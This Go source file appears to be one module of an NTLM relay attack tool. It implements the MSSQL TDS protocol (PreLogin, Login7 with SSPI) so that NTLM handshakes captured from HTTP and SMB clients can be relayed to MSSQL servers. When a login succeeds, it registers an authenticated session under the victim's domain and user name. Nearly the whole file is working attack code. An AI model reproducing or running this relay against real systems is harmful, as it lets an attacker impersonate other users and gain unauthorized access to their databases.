package main

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"
)

// TDS packet types
const (
	TDS_SQL_BATCH  byte = 0x01
	TDS_TABULAR    byte = 0x04
	TDS_LOGIN7     byte = 0x10
	TDS_SSPI       byte = 0x11
	TDS_PRELOGIN   byte = 0x12
	TDS_HEADER_LEN      = 8
)

// TDS status flags
const (
	TDS_STATUS_EOM byte = 0x01
)

// TDS PreLogin option tokens
const (
	TDS_PRELOGIN_VERSION    byte = 0x00
	TDS_PRELOGIN_ENCRYPTION byte = 0x01
	TDS_PRELOGIN_INSTOPT    byte = 0x02
	TDS_PRELOGIN_THREADID   byte = 0x03
	TDS_PRELOGIN_MARS       byte = 0x04
	TDS_PRELOGIN_TERMINATOR byte = 0xFF
)

// TDS encryption values
const (
	TDS_ENCRYPT_ON      byte = 0x01
	TDS_ENCRYPT_NOT_SUP byte = 0x02
	TDS_ENCRYPT_REQ     byte = 0x03
)

// TDS token types
const (
	TDS_TOKEN_ERROR    byte = 0xAA
	TDS_TOKEN_INFO     byte = 0xAB
	TDS_TOKEN_LOGINACK byte = 0xAD
	TDS_TOKEN_ENVCHANGE byte = 0xE3
	TDS_TOKEN_DONE     byte = 0xFD
)

// httpMSSQLRelays stores in-progress MSSQL relay connections between Type 1 and Type 3.
var httpMSSQLRelays sync.Map

// findFirstMSSQLTarget returns the first mssql:// target, or "".
func findFirstMSSQLTarget() string {
	for _, t := range targets {
		if strings.HasPrefix(t, "mssql://") {
			return t
		}
	}
	return ""
}

// ---------------------------------------------------------------------------
// TDS packet I/O
// ---------------------------------------------------------------------------

// readTDSPacket reads a complete TDS message, reassembling multi-packet messages.
func readTDSPacket(conn net.Conn) (pktType byte, payload []byte, err error) {
	hdr := make([]byte, TDS_HEADER_LEN)
	for {
		if _, err := io.ReadFull(conn, hdr); err != nil {
			return 0, nil, err
		}
		if pktType == 0 {
			pktType = hdr[0]
		}
		length := int(binary.BigEndian.Uint16(hdr[2:4]))
		if length < TDS_HEADER_LEN {
			return 0, nil, fmt.Errorf("invalid TDS packet length: %d", length)
		}
		data := make([]byte, length-TDS_HEADER_LEN)
		if len(data) > 0 {
			if _, err := io.ReadFull(conn, data); err != nil {
				return 0, nil, err
			}
		}
		payload = append(payload, data...)
		if hdr[1]&TDS_STATUS_EOM != 0 {
			return pktType, payload, nil
		}
	}
}

// writeTDSPacket writes a single TDS packet with EOM set.
func writeTDSPacket(conn net.Conn, pktType byte, payload []byte) error {
	length := TDS_HEADER_LEN + len(payload)
	hdr := make([]byte, TDS_HEADER_LEN)
	hdr[0] = pktType
	hdr[1] = TDS_STATUS_EOM
	binary.BigEndian.PutUint16(hdr[2:4], uint16(length))
	hdr[6] = 1 // PacketID
	if _, err := conn.Write(hdr); err != nil {
		return err
	}
	if len(payload) > 0 {
		if _, err := conn.Write(payload); err != nil {
			return err
		}
	}
	return nil
}

// ---------------------------------------------------------------------------
// TDS PreLogin
// ---------------------------------------------------------------------------

// buildTDSPreLogin builds a PreLogin request body.
func buildTDSPreLogin() []byte {
	// 5 options * 5 bytes each + 1 terminator = 26 bytes for headers
	// Data: VERSION(6) + ENCRYPTION(1) + INSTOPT(1) + THREADID(4) + MARS(1) = 13 bytes
	const headerLen = 5*5 + 1 // 26
	dataStart := headerLen

	body := make([]byte, headerLen+13)
	off := dataStart

	// VERSION
	body[0] = TDS_PRELOGIN_VERSION
	binary.BigEndian.PutUint16(body[1:3], uint16(off))
	binary.BigEndian.PutUint16(body[3:5], 6)
	body[off] = 0x0F   // major
	body[off+1] = 0x00 // minor
	binary.BigEndian.PutUint16(body[off+2:off+4], 4153) // build
	off += 6

	// ENCRYPTION
	body[5] = TDS_PRELOGIN_ENCRYPTION
	binary.BigEndian.PutUint16(body[6:8], uint16(off))
	binary.BigEndian.PutUint16(body[8:10], 1)
	body[off] = TDS_ENCRYPT_NOT_SUP
	off++

	// INSTOPT
	body[10] = TDS_PRELOGIN_INSTOPT
	binary.BigEndian.PutUint16(body[11:13], uint16(off))
	binary.BigEndian.PutUint16(body[13:15], 1)
	body[off] = 0x00
	off++

	// THREADID
	body[15] = TDS_PRELOGIN_THREADID
	binary.BigEndian.PutUint16(body[16:18], uint16(off))
	binary.BigEndian.PutUint16(body[18:20], 4)
	off += 4

	// MARS
	body[20] = TDS_PRELOGIN_MARS
	binary.BigEndian.PutUint16(body[21:23], uint16(off))
	binary.BigEndian.PutUint16(body[23:25], 1)
	body[off] = 0x00

	// Terminator
	body[25] = TDS_PRELOGIN_TERMINATOR

	return body
}

// parseTDSPreLoginResponse checks the server's encryption setting.
func parseTDSPreLoginResponse(payload []byte) error {
	for i := 0; i < len(payload); {
		if payload[i] == TDS_PRELOGIN_TERMINATOR {
			break
		}
		if i+5 > len(payload) {
			return fmt.Errorf("truncated PreLogin response")
		}
		optType := payload[i]
		optOffset := int(binary.BigEndian.Uint16(payload[i+1 : i+3]))
		optLen := int(binary.BigEndian.Uint16(payload[i+3 : i+5]))
		i += 5

		if optType == TDS_PRELOGIN_ENCRYPTION && optLen >= 1 && optOffset < len(payload) {
			enc := payload[optOffset]
			if enc == TDS_ENCRYPT_ON || enc == TDS_ENCRYPT_REQ {
				return fmt.Errorf("server requires TDS encryption (0x%02x), relay cannot proceed", enc)
			}
			return nil
		}
	}
	return nil
}

// ---------------------------------------------------------------------------
// TDS Login7 with NTLM
// ---------------------------------------------------------------------------

// buildTDSLogin7WithNTLM builds a Login7 body with the NTLM blob in the SSPI field.
func buildTDSLogin7WithNTLM(rawNTLM []byte) []byte {
	const fixedLen = 94
	totalLen := fixedLen + len(rawNTLM)
	body := make([]byte, totalLen)

	binary.LittleEndian.PutUint32(body[0:4], uint32(totalLen))   // Length
	binary.LittleEndian.PutUint32(body[4:8], 0x74000004)         // TDSVersion 7.4
	binary.LittleEndian.PutUint32(body[8:12], 4096)              // PacketSize
	binary.LittleEndian.PutUint32(body[12:16], 0x07000000)       // ClientProgVer
	binary.LittleEndian.PutUint32(body[16:20], 1234)             // ClientPID
	body[24] = 0xE0                                               // OptionFlags1: UseDB|InitDB|SetLang
	body[25] = 0x03                                               // OptionFlags2: ODBC|IntSecurity
	binary.LittleEndian.PutUint32(body[32:36], 0x00000409)       // ClientLCID

	// All string offset/length pairs: offset=fixedLen, length=0
	for _, off := range []int{36, 40, 44, 48, 52, 56, 60, 64, 68, 82, 86} {
		binary.LittleEndian.PutUint16(body[off:off+2], uint16(fixedLen))
	}

	// SSPI: ibSSPI at 78, cbSSPI at 80
	binary.LittleEndian.PutUint16(body[78:80], uint16(fixedLen))
	binary.LittleEndian.PutUint16(body[80:82], uint16(len(rawNTLM)))
	// cbSSPILong at 90
	binary.LittleEndian.PutUint32(body[90:94], uint32(len(rawNTLM)))

	copy(body[fixedLen:], rawNTLM)
	return body
}

// ---------------------------------------------------------------------------
// TDS Login Response parsing
// ---------------------------------------------------------------------------

// parseTDSLoginResponse scans a token stream for LoginAck or Error.
func parseTDSLoginResponse(payload []byte) (bool, error) {
	i := 0
	for i < len(payload) {
		tokenType := payload[i]
		i++

		switch tokenType {
		case TDS_TOKEN_LOGINACK:
			return true, nil

		case TDS_TOKEN_ERROR:
			if i+2 > len(payload) {
				return false, fmt.Errorf("truncated error token")
			}
			tokLen := int(binary.LittleEndian.Uint16(payload[i : i+2]))
			i += 2 + tokLen
			return false, nil

		case TDS_TOKEN_ENVCHANGE, TDS_TOKEN_INFO:
			if i+2 > len(payload) {
				return false, fmt.Errorf("truncated token 0x%02x", tokenType)
			}
			tokLen := int(binary.LittleEndian.Uint16(payload[i : i+2]))
			i += 2 + tokLen

		case TDS_TOKEN_DONE, 0xFE, 0xFF:
			i += 12 // status(2) + curcmd(2) + rowcount(8)

		default:
			if i+2 > len(payload) {
				return false, fmt.Errorf("truncated unknown token 0x%02x", tokenType)
			}
			tokLen := int(binary.LittleEndian.Uint16(payload[i : i+2]))
			i += 2 + tokLen
		}
	}
	return false, fmt.Errorf("no LoginAck or Error token found")
}

// ---------------------------------------------------------------------------
// HTTP → MSSQL relay
// ---------------------------------------------------------------------------

// httpRelayToMSSQL relays NTLM from the HTTP proxy to an MSSQL target.
func httpRelayToMSSQL(stateKey, targetURL string, ntlmType uint32, rawNTLM []byte) (serverCreds []byte, ok bool, fullUser string, err error) {
	if ntlmType == 1 {
		creds, err := httpRelayMSSQLType1(stateKey, targetURL, rawNTLM)
		return creds, false, "", err
	}
	if ntlmType == 3 {
		ok, fullUser, err := httpRelayMSSQLType3(stateKey, rawNTLM)
		return nil, ok, fullUser, err
	}
	return nil, false, "", fmt.Errorf("unexpected NTLM type %d", ntlmType)
}

func httpRelayMSSQLType1(stateKey, targetURL string, rawNTLM []byte) ([]byte, error) {
	u, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("parse target URL: %w", err)
	}

	hostport, _, _ := parseTarget(u)
	hostOnly := u.Hostname()
	port := 1433
	if _, portStr, err := net.SplitHostPort(u.Host); err == nil {
		if pp, err := strconv.Atoi(portStr); err == nil {
			port = pp
		}
	}

	// Check for existing active session
	sessionsMu.RLock()
	if byPort, ok := sessions[hostOnly]; ok {
		if byUser, ok := byPort[port]; ok {
			for _, sess := range byUser {
				if !sess.Dead.Load() {
					sessionsMu.RUnlock()
					return nil, fmt.Errorf("active session already exists for %s", targetURL)
				}
			}
		}
	}
	sessionsMu.RUnlock()

	// TCP connect
	conn, err := net.DialTimeout("tcp4", hostport, 5*time.Second)
	if err != nil {
		return nil, fmt.Errorf("connect to %s: %w", targetURL, err)
	}

	// PreLogin
	if err := writeTDSPacket(conn, TDS_PRELOGIN, buildTDSPreLogin()); err != nil {
		conn.Close()
		return nil, fmt.Errorf("send PreLogin: %w", err)
	}

	pktType, payload, err := readTDSPacket(conn)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("read PreLogin response: %w", err)
	}
	if pktType != TDS_TABULAR && pktType != TDS_PRELOGIN {
		conn.Close()
		return nil, fmt.Errorf("unexpected PreLogin response type 0x%02x", pktType)
	}
	if err := parseTDSPreLoginResponse(payload); err != nil {
		conn.Close()
		return nil, err
	}

	// Login7 with NTLM Type 1 in SSPI field
	if err := writeTDSPacket(conn, TDS_LOGIN7, buildTDSLogin7WithNTLM(rawNTLM)); err != nil {
		conn.Close()
		return nil, fmt.Errorf("send Login7: %w", err)
	}

	// Read SSPI response containing Type 2
	pktType, payload, err = readTDSPacket(conn)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("read SSPI response: %w", err)
	}
	if pktType != TDS_SSPI {
		conn.Close()
		return nil, fmt.Errorf("expected SSPI response (0x11), got 0x%02x", pktType)
	}

	// Store relay state
	up := &rawUpstream{
		conn: conn,
		br:   bufio.NewReader(conn),
		host: hostOnly,
	}
	relay := &smbRelayConn{
		up:        up,
		scheme:    "MSSQL",
		host:      hostOnly,
		port:      port,
		targetURL: targetURL,
		isMSSQL:   true,
	}
	httpMSSQLRelays.Store(stateKey, relay)

	return payload, nil // payload is raw NTLM Type 2
}

func httpRelayMSSQLType3(stateKey string, rawNTLM []byte) (bool, string, error) {
	val, ok := httpMSSQLRelays.LoadAndDelete(stateKey)
	if !ok {
		return false, "", fmt.Errorf("no pending MSSQL relay for key %s", stateKey)
	}
	relay := val.(*smbRelayConn)

	domain, user, _, err := parseNTLMv2AuthIdentity(rawNTLM)
	if err != nil {
		relay.up.conn.Close()
		return false, "", fmt.Errorf("parse Type 3 identity: %w", err)
	}
	fullUser := strings.ToUpper(domain) + `\` + user

	// Send SSPI with Type 3
	if err := writeTDSPacket(relay.up.conn, TDS_SSPI, rawNTLM); err != nil {
		relay.up.conn.Close()
		return false, fullUser, fmt.Errorf("send SSPI Type 3: %w", err)
	}

	// Read login response
	pktType, payload, err := readTDSPacket(relay.up.conn)
	if err != nil {
		relay.up.conn.Close()
		return false, fullUser, fmt.Errorf("read login response: %w", err)
	}
	if pktType != TDS_TABULAR {
		relay.up.conn.Close()
		return false, fullUser, fmt.Errorf("unexpected response type 0x%02x", pktType)
	}

	success, _ := parseTDSLoginResponse(payload)
	if !success {
		relay.up.conn.Close()
		return false, fullUser, nil
	}

	// Auth succeeded — register session
	pc := &MSSQLClient{}
	if _, err := registerSession("MSSQL", relay.host, relay.port, fullUser, relay.up, pc); err != nil {
		relay.up.conn.Close()
		return false, fullUser, fmt.Errorf("register session: %w", err)
	}

	return true, fullUser, nil
}

// ---------------------------------------------------------------------------
// SMB → MSSQL relay
// ---------------------------------------------------------------------------

// smbRelayType1MSSQL relays an NTLM Type 1 from the SMB capture server to an MSSQL target.
func smbRelayType1MSSQL(clientAddr string, rawNTLM []byte) (*smbRelayConn, []byte, error) {
	mssqlTarget := findFirstMSSQLTarget()
	if mssqlTarget == "" {
		return nil, nil, fmt.Errorf("no MSSQL target available")
	}

	u, err := url.Parse(mssqlTarget)
	if err != nil {
		return nil, nil, fmt.Errorf("parse target URL: %w", err)
	}

	hostport, _, _ := parseTarget(u)
	hostOnly := u.Hostname()
	port := 1433
	if _, portStr, err := net.SplitHostPort(u.Host); err == nil {
		if pp, err := strconv.Atoi(portStr); err == nil {
			port = pp
		}
	}

	// Check for existing session
	sessionsMu.RLock()
	if byPort, ok := sessions[hostOnly]; ok {
		if byUser, ok := byPort[port]; ok {
			for _, sess := range byUser {
				if !sess.Dead.Load() {
					sessionsMu.RUnlock()
					return nil, nil, fmt.Errorf("active session already exists for %s", mssqlTarget)
				}
			}
		}
	}
	sessionsMu.RUnlock()

	// TCP connect
	conn, err := net.DialTimeout("tcp4", hostport, 5*time.Second)
	if err != nil {
		return nil, nil, fmt.Errorf("connect to %s: %w", mssqlTarget, err)
	}

	// PreLogin
	if err := writeTDSPacket(conn, TDS_PRELOGIN, buildTDSPreLogin()); err != nil {
		conn.Close()
		return nil, nil, fmt.Errorf("send PreLogin: %w", err)
	}

	pktType, payload, err := readTDSPacket(conn)
	if err != nil {
		conn.Close()
		return nil, nil, fmt.Errorf("read PreLogin response: %w", err)
	}
	if pktType != TDS_TABULAR && pktType != TDS_PRELOGIN {
		conn.Close()
		return nil, nil, fmt.Errorf("unexpected PreLogin response type 0x%02x", pktType)
	}
	if err := parseTDSPreLoginResponse(payload); err != nil {
		conn.Close()
		return nil, nil, err
	}

	// Login7 with NTLM Type 1
	if err := writeTDSPacket(conn, TDS_LOGIN7, buildTDSLogin7WithNTLM(rawNTLM)); err != nil {
		conn.Close()
		return nil, nil, fmt.Errorf("send Login7: %w", err)
	}

	// Read SSPI response (Type 2)
	pktType, payload, err = readTDSPacket(conn)
	if err != nil {
		conn.Close()
		return nil, nil, fmt.Errorf("read SSPI response: %w", err)
	}
	if pktType != TDS_SSPI {
		conn.Close()
		return nil, nil, fmt.Errorf("expected SSPI response (0x11), got 0x%02x", pktType)
	}

	up := &rawUpstream{
		conn: conn,
		br:   bufio.NewReader(conn),
		host: hostOnly,
	}
	relay := &smbRelayConn{
		up:        up,
		scheme:    "MSSQL",
		host:      hostOnly,
		port:      port,
		targetURL: mssqlTarget,
		isMSSQL:   true,
	}

	return relay, payload, nil // payload is raw NTLM Type 2
}

// smbRelayType3MSSQL completes the NTLM relay from SMB capture to an MSSQL target.
func smbRelayType3MSSQL(relay *smbRelayConn, rawNTLM []byte) (bool, string, error) {
	domain, user, _, err := parseNTLMv2AuthIdentity(rawNTLM)
	if err != nil {
		return false, "", fmt.Errorf("parse Type 3 identity: %w", err)
	}
	fullUser := strings.ToUpper(domain) + `\` + user

	// Send SSPI with Type 3
	if err := writeTDSPacket(relay.up.conn, TDS_SSPI, rawNTLM); err != nil {
		return false, fullUser, fmt.Errorf("send SSPI Type 3: %w", err)
	}

	// Read login response
	pktType, payload, err := readTDSPacket(relay.up.conn)
	if err != nil {
		return false, fullUser, fmt.Errorf("read login response: %w", err)
	}
	if pktType != TDS_TABULAR {
		return false, fullUser, fmt.Errorf("unexpected response type 0x%02x", pktType)
	}

	success, _ := parseTDSLoginResponse(payload)
	if !success {
		relay.up.conn.Close()
		return false, fullUser, nil
	}

	pc := &MSSQLClient{}
	if _, err := registerSession("MSSQL", relay.host, relay.port, fullUser, relay.up, pc); err != nil {
		relay.up.conn.Close()
		return false, fullUser, fmt.Errorf("register session: %w", err)
	}

	return true, fullUser, nil
}
